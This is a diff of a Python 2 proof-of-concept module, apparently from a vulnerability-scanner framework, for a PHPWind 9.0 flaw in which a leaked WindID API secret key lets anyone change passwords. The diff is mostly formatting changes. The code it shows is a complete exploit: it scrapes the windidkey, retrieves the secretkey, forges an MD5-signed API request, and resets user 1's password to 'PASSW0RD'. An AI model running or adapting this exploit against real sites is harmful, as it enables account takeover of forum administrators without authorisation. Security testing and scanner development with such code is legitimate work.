@@ -8,11 +8,12 @@ import json
 import urllib
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPWind_0002_p' # 平台漏洞编号，留空
+    vuln_id = 'PHPWind_0002_p'  # 平台漏洞编号，留空
     name = 'PHPWind 9.0 /src/windid/service/user/srv/WindidUserService.php 远程密码修改漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2014-08-17'  # 漏洞公布时间
     desc = '''
         PHPWind v9.0版本中上传头像处误将访问api的密钥泄露，导致 secretkey 泄露，导致可通过api任意修改密码。
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPWind'  # 漏洞应用名称
     product_version = '9.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a38c61f4-74be-4708-8c51-d3c530399c91'
@@ -33,11 +35,11 @@ class Poc(ABPoc):
 
     def verify(self):
         try:
-            #属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
+            # 属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #this poc need to login, so special cookie for target must be included in http headers.
+
+            # this poc need to login, so special cookie for target must be included in http headers.
             url = self.target
             cookie = ''
             header = {
@@ -47,7 +49,8 @@ class Poc(ABPoc):
             secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'
             # Regex
             match_uid = re.compile('m=space&uid=([\d])+')
-            match_windidkey = re.compile('windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
+            match_windidkey = re.compile(
+                'windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
             request = urllib2.Request(windidkey_url, headers=header)
             response = urllib2.urlopen(request).read()
             # Get windidkey
@@ -57,7 +60,8 @@ class Poc(ABPoc):
             except:
                 return None
             # Get secretkey
-            request = urllib2.Request(secretkey_url % (url, uid, windidkey, _time), data='uid=undefined')
+            request = urllib2.Request(secretkey_url % (
+                url, uid, windidkey, _time), data='uid=undefined')
             response = json.loads(urllib2.urlopen(request).read())
             try:
                 secretkey = response['1']['secretkey']
@@ -89,7 +93,8 @@ class Poc(ABPoc):
 
             # Regex
             match_uid = re.compile('m=space&uid=([\d])+')
-            match_windidkey = re.compile('windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
+            match_windidkey = re.compile(
+                'windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
             request = urllib2.Request(windidkey_url, headers=header)
             response = urllib2.urlopen(request).read()
 
@@ -101,7 +106,8 @@ class Poc(ABPoc):
                 return None
 
             # Get secretkey
-            request = urllib2.Request(secretkey_url % (url, uid, windidkey, _time), data='uid=undefined')
+            request = urllib2.Request(secretkey_url % (
+                url, uid, windidkey, _time), data='uid=undefined')
             response = json.loads(urllib2.urlopen(request).read())
             try:
                 secretkey = response['1']['secretkey']
@@ -112,8 +118,10 @@ class Poc(ABPoc):
             data = {'uid': 1}
             string = 'userid1uid1'
             _time = str(int(time.time()))
-            app_key = md5('%s%s%s' % (md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
-            request = urllib2.Request(vul_url % (url, 'get', app_key, _time), data=urllib.urlencode(data))
+            app_key = md5('%s%s%s' % (
+                md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
+            request = urllib2.Request(vul_url % (
+                url, 'get', app_key, _time), data=urllib.urlencode(data))
             response = json.loads(urllib2.urlopen(request).read())
             try:
                 username = response[u'username']
@@ -124,8 +132,10 @@ class Poc(ABPoc):
             data = {'password': 'PASSW0RD', 'uid': 1}
             string = 'userid1passwordPASSW0RDuid1'
             _time = str(int(time.time()))
-            app_key = md5('%s%s%s' % (md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
-            request = urllib2.Request(vul_url % (url, 'editUser', app_key, _time), data=urllib.urlencode(data))
+            app_key = md5('%s%s%s' % (
+                md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
+            request = urllib2.Request(vul_url % (
+                url, 'editUser', app_key, _time), data=urllib.urlencode(data))
             response = urllib2.urlopen(request).read()
 
             # Success
@@ -140,6 +150,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
